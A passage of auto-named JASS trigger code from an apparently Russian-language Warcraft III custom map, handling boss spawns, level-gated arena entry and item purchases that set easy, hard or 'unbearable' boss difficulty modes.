call CreateNUnitsAtLoc(1,$6E303735,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set Vz=GetUnitLoc(GroupPickRandomUnit(SR))
call CreateNUnitsAtLoc(1,$6E303733,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set Vz=GetUnitLoc(GroupPickRandomUnit(SR))
call CreateNUnitsAtLoc(1,$6E303732,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BhG takes nothing returns nothing
set dz=CreateTrigger()
call TriggerRegisterUnitEvent(dz,K0,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dz,function BhF)
endfunction
function BhH takes nothing returns boolean
if Td[2]==35 then
return true
endif
if Td[2]==20 then
return true
endif
if Td[2]==5 then
return true
endif
return false
endfunction
function BhI takes nothing returns boolean
if not BhH() then
return false
endif
return true
endfunction
function BhJ takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Td[2])) then
return false
endif
return true
endfunction
function BhK takes nothing returns nothing
if BhJ() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Td[2]))
set Td[2]=Td[2]-15
set Vz=GetRandomLocInRect(FQ)
call CreateNUnitsAtLoc(1,$6E303736,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(5.,$42544C46,GetLastCreatedUnit())
call IssuePointOrderLoc(GetLastCreatedUnit(),"impale",GetUnitLoc(GetLastCreatedUnit()))
call RemoveLocation(Vz)
if BhI() then
set Vz=GetRandomLocInRect(FQ)
call CreateNUnitsAtLoc(1,$6E303736,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(5.,$42544C46,GetLastCreatedUnit())
call IssuePointOrderLoc(GetLastCreatedUnit(),"impale",GetUnitLoc(GetLastCreatedUnit()))
call RemoveLocation(Vz)
else
endif
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BhL takes nothing returns nothing
set d0=CreateTrigger()
call TriggerRegisterUnitEvent(d0,K0,EVENT_UNIT_DAMAGED)
call TriggerAddAction(d0,function BhK)
endfunction
function BhM takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BhN takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6E303638
endfunction
function BhO takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6E303639
endfunction
function BhP takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6E303637
endfunction
function BhQ takes nothing returns boolean
return GetBooleanOr(BhO(),BhP())
endfunction
function BhR takes nothing returns boolean
return GetBooleanOr(BhN(),BhQ())
endfunction
function BhS takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BhT takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=51) then
return false
endif
return true
endfunction
function BhU takes nothing returns nothing
local location Mc
if BhT() then
set Mc=GetRectCenter(Ed)
call SetUnitPositionLoc(GetTriggerUnit(),Mc)
call RemoveLocation(Mc)
call SetUnitOwner(Lz,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lz,true)
call SetUnitLifePercentBJ(Lz,100.)
set SR=GetUnitsInRectMatching(Ed,Condition(function BhR))
call ForGroupBJ(SR,function BhS)
call DestroyGroup(SR)
else
call DisplayTextToForce(GetPlayersAll(),"Для входа требуется 51 уровень!")
endif
set Mc=null
endfunction
function BhV takes nothing returns nothing
set Ux=CreateTrigger()
call DisableTrigger(Ux)
call TriggerRegisterEnterRectSimple(Ux,Ea)
call TriggerAddCondition(Ux,Condition(function BhM))
call TriggerAddAction(Ux,function BhU)
endfunction
function BhW takes nothing returns nothing
local location d2
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(10.)
set d2=GetRandomLocInRect(Ed)
call CreateNUnitsAtLoc(1,$6E303641,Player(10),d2,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(25.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(d2)
call EnableTrigger(GetTriggeringTrigger())
set d2=null
endfunction
function BhX takes nothing returns nothing
set d1=CreateTrigger()
call TriggerRegisterUnitEvent(d1,Lz,EVENT_UNIT_DAMAGED)
call TriggerAddAction(d1,function BhW)
endfunction
function BhY takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$6E303548 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303638 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303639 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$6E303637 then
return true
endif
return false
endfunction
function BhZ takes nothing returns boolean
if not BhY() then
return false
endif
return true
endfunction
function Bha takes nothing returns nothing
call IssuePointOrderLoc(GetAttackedUnitBJ(),"impale",GetUnitLoc(GetAttacker()))
endfunction
function Bhb takes nothing returns nothing
set d3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(d3,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(d3,Condition(function BhZ))
call TriggerAddAction(d3,function Bha)
endfunction
function Bhc takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bhd takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(10.)
if Bhc() then
call ShowUnit(Lz,false)
call CreateNUnitsAtLoc(1,$6E303638,Player(10),GetRandomLocInRect(Ed),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$6E303638,Player(10),GetRandomLocInRect(Ed),bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$6E303638,Player(10),GetRandomLocInRect(Ed),bj_UNIT_FACING)
call TriggerSleepAction(10.)
call ShowUnit(Lz,true)
else
endif
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bhe takes nothing returns nothing
set d4=CreateTrigger()
call TriggerRegisterUnitEvent(d4,Lz,EVENT_UNIT_DAMAGED)
call TriggerAddAction(d4,function Bhd)
endfunction
function Bhf takes nothing returns nothing
if RectContainsUnit(GW,MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==true then
if GetOwningPlayer(Lj)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(Lj,false)
call SetUnitOwner(Lj,Player(11),true)
endif
endif
if RectContainsUnit(BS,MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==true then
if GetOwningPlayer(K9)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(K9,false)
call SetUnitOwner(K9,Player(11),true)
endif
endif
if RectContainsUnit(BD,MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==true then
if GetOwningPlayer(K5)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(K5,false)
call SetUnitOwner(K5,Player(11),true)
endif
endif
if RectContainsUnit(J,MT[GetConvertedPlayerId(GetTriggerPlayer())-1])==true then
if GetOwningPlayer(Kv)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(Kv,false)
call SetUnitOwner(Kv,Player(11),true)
endif
endif
if RectContainsUnit(Gd,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(K1)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(K1,false)
call SetUnitOwner(K1,Player(11),true)
endif
endif
if RectContainsUnit(GJ,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Kw)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(Kw,Player(11),true)
call SetUnitInvulnerable(Kw,false)
endif
endif
if RectContainsUnit(FW,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Kx)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(Kx,Player(11),true)
call SetUnitInvulnerable(Kx,false)
endif
endif
if RectContainsUnit(Fk,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Lt)==Player(PLAYER_NEUTRAL_PASSIVE) then
call ModifyGateBJ(bj_GATEOPERATION_CLOSE,HX)
call ModifyGateBJ(bj_GATEOPERATION_CLOSE,HW)
call SetUnitOwner(Lt,Player(11),true)
call SetUnitInvulnerable(Lt,false)
endif
endif
if RectContainsUnit(EK,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Lr)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(Lr,Player(11),true)
call SetUnitInvulnerable(Lr,false)
endif
endif
if RectContainsUnit(FH,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Lo)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(Lo,Player(11),true)
call SetUnitInvulnerable(Lo,false)
endif
endif
if RectContainsUnit(Ey,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Ls)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(Ls,Player(11),true)
call SetUnitInvulnerable(Ls,false)
endif
endif
if RectContainsUnit(FL,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(K0)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(K0,Player(11),true)
call SetUnitInvulnerable(K0,false)
endif
endif
if RectContainsUnit(Ed,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Lz)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(Lz,Player(11),true)
call SetUnitInvulnerable(Lz,false)
endif
endif
if RectContainsUnit(D6,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Ly)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(Ly,false)
call SetUnitOwner(Ly,Player(11),true)
endif
endif
if RectContainsUnit(D7,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(L5)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(L5,false)
call SetUnitOwner(L5,Player(11),true)
call CreateUnit(Player(10),$75303056,-15100,-21300,90)
call CreateUnit(Player(10),$75303057,-15100,-21300,90)
endif
endif
if RectContainsUnit(Cv,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(LW)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(LW,Player(11),true)
call SetUnitInvulnerable(LW,false)
endif
endif
if RectContainsUnit(DP,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Ll)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(Ll,false)
call SetUnitOwner(Ll,Player(11),true)
endif
endif
if RectContainsUnit(D2,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(L4)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(L4,false)
call SetUnitOwner(L4,Player(11),true)
endif
endif
if RectContainsUnit(Gt,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(LR)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(LR,false)
call SetUnitOwner(LR,Player(11),true)
endif
endif
if RectContainsUnit(DW,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(Lu)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(Lu,false)
call SetUnitOwner(Lu,Player(11),true)
endif
endif
if RectContainsUnit(Cs,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(LU)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(LU,false)
call SetUnitOwner(LU,Player(11),true)
endif
endif
if RectContainsUnit(EO,MT[GetPlayerId(GetTriggerPlayer())])==true then
call SetUnitInvulnerable(Li,false)
call SetUnitOwner(Li,Player(11),true)
call SetUnitInvulnerable(Vd[2],false)
call SetUnitOwner(Vd[2],Player(11),true)
endif
if RectContainsUnit(EN,MT[GetPlayerId(GetTriggerPlayer())])==true then
call SetUnitInvulnerable(Lh,false)
call SetUnitOwner(Lh,Player(11),true)
call SetUnitInvulnerable(Vd[1],false)
call SetUnitOwner(Vd[1],Player(11),true)
endif
if RectContainsUnit(Gz,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(K8)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(K8,false)
call SetUnitOwner(K8,Player(11),true)
endif
endif
if RectContainsUnit(Gx,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(K3)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitInvulnerable(K3,false)
call SetUnitOwner(K3,Player(11),true)
endif
endif
if RectContainsUnit(Gu,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(LC)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(LC,Player(11),true)
call SetUnitInvulnerable(LC,false)
endif
endif
if RectContainsUnit(Dj,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(LH)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(LH,Player(11),true)
call SetUnitInvulnerable(LH,false)
endif
endif
if RectContainsUnit(B7,MT[GetPlayerId(GetTriggerPlayer())])==true then
if GetOwningPlayer(LQ)==Player(PLAYER_NEUTRAL_PASSIVE) then
call SetUnitOwner(LQ,Player(11),true)
call SetUnitInvulnerable(LQ,false)
endif
endif
endfunction
function Bhg takes nothing returns nothing
local trigger d5=CreateTrigger()
call TriggerRegisterPlayerEvent(d5,Player(0),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(1),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(2),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(3),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(4),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(5),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(6),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerEvent(d5,Player(7),EVENT_PLAYER_END_CINEMATIC)
call TriggerAddAction(d5,function Bhf)
set d5=null
endfunction
function Bhh takes nothing returns nothing
local integer L9=0
local integer Pd=0
loop
if GetPlayerSlotState(Player(L9))==PLAYER_SLOT_STATE_PLAYING and GetPlayerController(Player(L9))==MAP_CONTROL_USER then
set Pd=Pd+1
endif
set L9=L9+1
exitwhen L9>8
endloop
if Pd<2 then
endif
endfunction
function Bhi takes nothing returns nothing
set d6=CreateTrigger()
call TriggerRegisterUnitEvent(d6,Ll,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,Lu,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,K3,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,K8,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,L4,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,Ly,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,Ls,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,Lr,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,Lo,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,LP,EVENT_UNIT_DEATH)
call TriggerRegisterUnitEvent(d6,Lt,EVENT_UNIT_DEATH)
call TriggerAddAction(d6,function Bhh)
endfunction
function Bhj takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305A54) then
return false
endif
return true
endfunction
function Bhk takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305A55) then
return false
endif
return true
endfunction
function Bhl takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305652) then
return false
endif
return true
endfunction
function Bhm takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305A53) then
return false
endif
return true
endfunction
function Bhn takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305531) then
return false
endif
return true
endfunction
function Bho takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304A51) then
return false
endif
return true
endfunction
function Bhp takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4930414C) then
return false
endif
return true
endfunction
function Bhq takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4930414B) then
return false
endif
return true
endfunction
function Bhr takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4930414A) then
return false
endif
return true
endfunction
function Bhs takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304149) then
return false
endif
return true
endfunction
function Bht takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304148) then
return false
endif
return true
endfunction
function Bhu takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304132) then
return false
endif
return true
endfunction
function Bhv takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303858) then
return false
endif
return true
endfunction
function Bhw takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303859) then
return false
endif
return true
endfunction
function Bhx takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4930344F) then
return false
endif
return true
endfunction
function Bhy takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303450) then
return false
endif
return true
endfunction
function Bhz takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303257) then
return false
endif
return true
endfunction
function Bh0 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303258) then
return false
endif
return true
endfunction
function Bh1 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303255) then
return false
endif
return true
endfunction
function Bh2 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303256) then
return false
endif
return true
endfunction
function Bh3 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303251) then
return false
endif
return true
endfunction
function Bh4 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303254) then
return false
endif
return true
endfunction
function Bh5 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303252) then
return false
endif
return true
endfunction
function Bh6 takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303253) then
return false
endif
return true
endfunction
function Bh7 takes nothing returns nothing
if Bhj() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Джек|r")
call RemoveUnit(GetTriggerUnit())
call EnableTrigger(dj)
call AddSpecialEffectLocBJ(GetRectCenter(Ga),"war3mapImported\\Void Teleport To.mdx")
else
endif
if Bhk() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса Джек|r")
call RemoveUnit(GetTriggerUnit())
call EnableTrigger(dj)
call AddSpecialEffectLocBJ(GetRectCenter(Ga),"war3mapImported\\Void Teleport To.mdx")
call SetPlayerTechResearchedSwap($52303043,2,Player(10))
call SetPlayerTechResearchedSwap($52303049,3,Player(11))
call UnitAddAbility(Kx,$41304456)
call SetUnitAbilityLevel(Kx,$41304456,2)
call UnitAddAbility(Kx,$4131345A)
call EnableTrigger(de)
call EnableTrigger(dg)
call EnableTrigger(dh)
else
endif
if Bhl() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Асмодеус|r")
call RemoveUnit(Ib)
set d8[8]=1
else
endif
if Bhm() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса Асмодеус|r")
call RemoveUnit(Ib)
set d8[8]=2
call SetPlayerTechResearchedSwap($52303043,2,Player(10))
call SetPlayerTechResearchedSwap($52303032,5,Player(11))
call UnitAddAbility(Kw,$41304456)
call SetUnitAbilityLevel(Kw,$41304456,2)
call SetUnitAbilityLevel(Kx,$41304A43,2)
call SetUnitAbilityLevel(Kx,$41304A42,2)
call UnitAddAbility(Kw,$4131345A)
call EnableTrigger(d9)
else
endif
if Bhn() then
call EnableTrigger(eB)
call EnableTrigger(eC)
call EnableTrigger(eD)
call EnableTrigger(eE)
call EnableTrigger(eF)
set TS[1]=80
set TS[2]=75
set TS[3]=10
set TS[4]=95
set TS[5]=90
call ShowUnit(Jq,false)
call SetUnitInvulnerable(Jq,true)
set V0=GetRectCenter(D6)
call SetUnitPositionLocFacingBJ(Ly,V0,270.)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call ShowUnit(Ly,true)
call RemoveLocation(V0)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса Ассир|r")
call RemoveUnit(JU)
call UnitAddAbilityBJ($41313748,Ly)
call UnitAddAbilityBJ($41303435,Ly)
call UnitAddAbilityBJ($41313644,Ly)
call UnitAddAbilityBJ($41305937,Ly)
call SetUnitAbilityLevel(Ly,$41313451,2)
call SetUnitAbilityLevel(Ly,$41313452,2)
call SetPlayerTechResearchedSwap($52303048,3,Player(11))
else
endif
if Bho() then
call EnableTrigger(eG)
call EnableTrigger(eH)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Ассир|r")
call RemoveUnit(JU)
set TS[1]=80
set TS[2]=75
set TS[3]=10
set TS[4]=95
set TS[5]=90
call ShowUnit(Jq,false)
call SetUnitInvulnerable(Jq,true)
set V0=GetRectCenter(D6)
call SetUnitPositionLocFacingBJ(Ly,V0,270.)
call SetUnitOwner(Ly,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ly,true)
call RemoveLocation(V0)
set YV[99]=GetRectCenter(Gs)
else
endif
if Bhp() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF9696Выбран Невыносимый режим босса|r |c0000FF00Маркиз|r")
call UnitAddAbilityBJ($41436374,LQ)
call UnitAddAbilityBJ($41304454,LQ)
call UnitAddAbilityBJ($5330304A,LQ)
call SetUnitAbilityLevel(LQ,$41304452,3)
call UnitAddAbility(LQ,$41304F4B)
call UnitAddAbility(LQ,$4131394F)
call UnitAddAbility(LQ,$41305655)
call UnitAddAbility(LQ,$41313350)
call SetUnitAbilityLevel(LQ,$4131394F,7)
call SetPlayerTechResearchedSwap($52303047,4,Player(11))
call SetPlayerTechResearchedSwap($52303046,1,Player(11))
call RemoveUnit(IL)
call EnableTrigger(eI)
call EnableTrigger(eJ)
else
endif
if Bhq() then
call SetUnitOwner(LH,Player(11),true)
call EnableTrigger(eK)
call EnableTrigger(eL)
call SetUnitAbilityLevel(LH,$41303647,2)
call UnitAddAbility(LH,$41313350)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF9696Выбран Невыносимый режим босса|r |c0000FF00Кай|r")
call UnitAddAbilityBJ($41303648,LH)
call UnitAddAbilityBJ($41304449,LH)
call UnitAddAbilityBJ($4130444B,LH)
call UnitAddAbilityBJ($41436365,LH)
call UnitAddAbilityBJ($4130444C,LH)
call UnitAddAbilityBJ($41436374,LH)
call UnitAddAbilityBJ($5330304A,LH)
call SetPlayerTechResearchedSwap($52303044,3,Player(11))
call SetPlayerTechResearchedSwap($52303035,1,Player(11))
call SetUnitVertexColor(LH,255,0,0,150)
call CreateNUnitsAtLoc(1,$68303041,Player(11),GetRectCenter(Dj),bj_UNIT_FACING)
call RemoveUnit(H4)
call SetUnitInvulnerable(LH,false)
call ShowUnitShow(LH)
call PauseUnitBJ(false,LH)
else
endif
if Bhr() then
call EnableTrigger(eM)
call EnableTrigger(eN)
call EnableTrigger(eO)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF9696Выбран Невыносимый режим босса|r |c0000FF00Узуран|r")
call SetUnitAbilityLevelSwapped($4130314A,K9,3)
call UnitAddAbilityBJ($41304358,K9)
call UnitAddAbilityBJ($5330304A,K9)
call UnitAddAbilityBJ($41313350,K9)
call SetPlayerTechResearchedSwap($52303039,2,Player(11))
call SetPlayerTechResearchedSwap($52303038,1,Player(11))
call SetUnitVertexColor(K9,255,0,255,100)
call RemoveUnit(H2)
call SetUnitInvulnerable(K9,false)
call ShowUnitShow(K9)
call PauseUnitBJ(false,K9)
call SetUnitOwner(K9,Player(11),true)
else
endif
if Bhs() then
call EnableTrigger(eP)
set d8[3]=3
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF9696Выбран Невыносимый режим босса|r |c0000FF00Ксерон|r")
call UnitAddAbilityBJ($4130384C,K5)
call UnitAddAbilityBJ($41304352,K5)
call UnitAddAbilityBJ($5330304A,K5)
call UnitAddAbilityBJ($41304D33,K5)
call SetPlayerTechResearchedSwap($52303041,2,Player(11))
call SetPlayerTechResearchedSwap($52303036,1,Player(11))
call SetUnitVertexColor(K5,0,0,0,100)
call CreateNUnitsAtLoc(1,$6E303139,Player(11),GetRectCenter(i),bj_UNIT_FACING)
call RemoveUnit(H1)
call SetUnitInvulnerable(K5,false)
call ShowUnitShow(K5)
call PauseUnitBJ(false,K5)
call SetUnitOwner(K5,Player(11),true)
else
endif
if Bht() then
set d8[2]=3
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF9696Выбран Невыносимый режим босса|r |c0000FF00Матерь Пауков|r")
call UnitAddAbilityBJ($4130434B,Kv)
call UnitAddAbilityBJ($4161736C,Kv)
call UnitAddAbilityBJ($41304D32,Kv)
call SetPlayerTechResearchedSwap($52303037,1,Player(11))
call SetPlayerTechResearchedSwap($52303042,2,Player(11))
call UnitAddAbilityBJ($41303050,Kv)
call UnitAddAbilityBJ($4130434C,Kv)
call UnitAddAbilityBJ($41303958,Kv)
call UnitAddAbilityBJ($4130504B,Kv)
call UnitAddAbilityBJ($53303046,Kv)
call RemoveUnit(Hz)
call SetUnitVertexColorBJ(Kv,0.,0.,100,50.)
else
endif
if Bhu() then
set d8[1]=3
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF9696Выбран Невыносимый режим босса|r |c0000FF00Разрушитель Природы|r")
call SetPlayerTechResearchedSwap($52303034,1,Player(11))
call SetPlayerTechResearchedSwap($52303043,2,Player(11))
call nl(K1,100)
call UnitAddAbility(K1,$41304D31)
call UnitAddAbility(K1,$41304E45)
call RemoveUnit(Hy)
else
endif
if Bhv() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Маркиз|r")
call RemoveUnit(IL)
call EnableTrigger(eQ)
call EnableTrigger(eR)
else
endif
if Bhw() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса|r |c0000FF00Маркиз|r")
call UnitAddAbilityBJ($4130384D,LQ)
call UnitAddAbilityBJ($4130384F,LQ)
call UnitAddAbilityBJ($41436374,LQ)
call SetUnitAbilityLevel(LQ,$41304452,2)
call RemoveUnit(IL)
call EnableTrigger(eS)
call EnableTrigger(eT)
else
endif
if Bhx() then
call EnableTrigger(eU)
call EnableTrigger(eV)
call EnableTrigger(eW)
call EnableTrigger(eX)
call SetUnitInvulnerable(LH,false)
call ShowUnitShow(LH)
call PauseUnitBJ(false,LH)
call SetUnitOwner(LH,Player(11),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Кай|r")
call RemoveUnit(H4)
else
endif
if Bhy() then
call EnableTrigger(eY)
call EnableTrigger(eZ)
call EnableTrigger(ea)
call EnableTrigger(eb)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса|r |c0000FF00Кай|r")
call UnitAddAbilityBJ($4130384D,LH)
call UnitAddAbilityBJ($4130384E,LH)
call UnitAddAbilityBJ($41303648,LH)
call CreateNUnitsAtLoc(1,$68303041,Player(11),GetRectCenter(Dj),bj_UNIT_FACING)
call RemoveUnit(H4)
call SetUnitInvulnerable(LH,false)
call ShowUnitShow(LH)
call PauseUnitBJ(false,LH)
call SetUnitOwner(LH,Player(11),true)
else
endif
if Bhz() then
call EnableTrigger(ec)
call EnableTrigger(Zq)
call SetUnitInvulnerable(K9,false)
call ShowUnitShow(K9)
call PauseUnitBJ(false,K9)
call SetUnitOwner(K9,Player(11),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Узуран|r")
call RemoveUnit(H2)
else
endif
if Bh0() then
call EnableTrigger(Zr)
call EnableTrigger(ed)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса|r |c0000FF00Узуран|r")
call UnitAddAbilityBJ($4130384D,K9)
call CreateNUnitsAtLoc(1,$6E303139,Player(11),GetRectCenter(x),bj_UNIT_FACING)
call RemoveUnit(H2)
call SetUnitInvulnerable(K9,false)
call ShowUnitShow(K9)
call PauseUnitBJ(false,K9)
call SetUnitOwner(K9,Player(11),true)
